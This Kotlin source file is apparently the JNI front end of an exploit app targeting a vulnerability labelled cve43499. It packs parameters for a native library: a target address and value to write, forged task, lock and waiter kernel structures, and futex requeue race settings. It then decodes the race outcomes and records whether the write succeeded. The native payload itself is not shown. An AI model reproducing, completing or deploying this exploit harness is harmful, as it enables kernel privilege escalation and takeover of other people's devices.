package com.ghostlock.app.jni.cve43499

import java.nio.ByteBuffer
import java.nio.ByteOrder

data class NativeSelectStackParams(
    val target: Long,
    val value: Long,
    val fdCount: Int,
    val attempts: Int,
    val selectWaitUs: Long,
    val niceModulus: Int,
    val waiterShift: Int,
    val compact: Boolean,
    val fakeWaiterPrio: Long,
    val fakeTask: Long,
    val fakeLock: Long,
    val wordTask: Int,
    val wordLock: Int,
    val wordTreePc: Int,
    val wordTreeRight: Int,
    val wordTreeLeft: Int,
    val wordPiPc: Int,
    val wordPiRight: Int,
    val wordPiLeft: Int,
    val wordWakePrio: Int,
    val wordDeadline: Int,
    val wordWwCtx: Int,
    val waitWord: Long,
    val chainWord: Long,
    val targetWord: Long,
    val selected: IntArray,
    val fakeRight: Long = 0L,
) {
    fun encode(): ByteArray {
        require(selected.size <= 64) { "selected is at most 64" }
        val buffer = ByteBuffer.allocate(HEADER + selected.size * 4).order(ByteOrder.LITTLE_ENDIAN)
        buffer.putInt(0, MAGIC)
        buffer.putShort(4, VERSION.toShort())
        buffer.putShort(6, HEADER.toShort())
        buffer.putInt(8, buffer.capacity())
        buffer.putLong(32, target)
        buffer.putLong(40, value)
        buffer.putInt(48, fdCount)
        buffer.putInt(52, attempts)
        buffer.putLong(56, selectWaitUs)
        buffer.putInt(64, niceModulus)
        buffer.putInt(68, waiterShift)
        buffer.putInt(72, if (compact) 1 else 0)
        buffer.putLong(80, fakeWaiterPrio)
        buffer.putLong(88, fakeTask)
        buffer.putLong(96, fakeLock)
        buffer.putInt(104, wordTask); buffer.putInt(108, wordLock)
        buffer.putInt(112, wordTreePc); buffer.putInt(116, wordTreeRight); buffer.putInt(120, wordTreeLeft)
        buffer.putInt(124, wordPiPc); buffer.putInt(128, wordPiRight); buffer.putInt(132, wordPiLeft)
        buffer.putInt(136, wordWakePrio); buffer.putInt(140, wordDeadline); buffer.putInt(144, wordWwCtx)
        buffer.putLong(152, waitWord); buffer.putLong(160, chainWord); buffer.putLong(168, targetWord)
        buffer.putInt(176, selected.size)
        buffer.putLong(184, fakeRight)
        selected.forEachIndexed { index, fd -> buffer.putInt(HEADER + index * 4, fd) }
        return buffer.array()
    }

    companion object {
        const val MAGIC = 0x474C5352
        const val VERSION = 1
        const val HEADER = 192
    }
}

data class NativeSelectStackResult(
    val statusCode: Int,
    val statusStep: Int,
    val attempts: Int,
    val calls: Int,
    val successes: Int,
    val waiterLock: Int,
    val waiterPark: Int,
    val waiterParkErrno: Int,
    val consumerSetattr: Int,
    val consumerSetattrErrno: Int,
    val requeueResult: Int,
    val requeueErrno: Int,
    val raceLock: Int,
    val raceRequeue: Int,
    val raceRequeueErrno: Int,
    val raceOutcome: Int,
    val targetOwnerWord: Int,
    val waitWordValue: Int,
    val waiterParkElapsedUs: Int,
    val ownerRequeueResult: Int,
    val ownerRequeueErrno: Int,
    val selectResult: Int,
    val selectErrno: Int,
) {
    val ok: Boolean get() = statusCode == 0 && successes > 0

    companion object {
        const val RESULT_MAGIC = 0x474C5353
        const val HEADER = 128

        fun decode(bytes: ByteArray?): NativeSelectStackResult? {
            if (bytes == null || bytes.size < HEADER) return null
            val buffer = ByteBuffer.wrap(bytes).order(ByteOrder.LITTLE_ENDIAN)
            if (buffer.getInt(0) != RESULT_MAGIC || buffer.getInt(8) != HEADER) return null
            return NativeSelectStackResult(
                statusCode = buffer.getInt(16), statusStep = buffer.getInt(20),
                attempts = buffer.getInt(24), calls = buffer.getInt(28), successes = buffer.getInt(32),
                waiterLock = buffer.getInt(36), waiterPark = buffer.getInt(40),
                waiterParkErrno = buffer.getInt(44), consumerSetattr = buffer.getInt(48),
                consumerSetattrErrno = buffer.getInt(52),
                requeueResult = buffer.getInt(56), requeueErrno = buffer.getInt(60),
                raceLock = buffer.getInt(64), raceRequeue = buffer.getInt(68),
                raceOutcome = buffer.getInt(72), raceRequeueErrno = buffer.getInt(76),
                targetOwnerWord = buffer.getInt(80), waitWordValue = buffer.getInt(84),
                waiterParkElapsedUs = buffer.getInt(88),
                ownerRequeueResult = buffer.getInt(92), ownerRequeueErrno = buffer.getInt(96),
                selectResult = buffer.getInt(100), selectErrno = buffer.getInt(104),
            )
        }
    }
}

object NativeSelectStackJni {
    init { System.loadLibrary("gl43499native") }
    private external fun execute(params: ByteArray, selected: IntArray): ByteArray?

    fun run(params: NativeSelectStackParams): NativeSelectStackResult? =
        NativeSelectStackResult.decode(execute(params.encode(), params.selected))
}
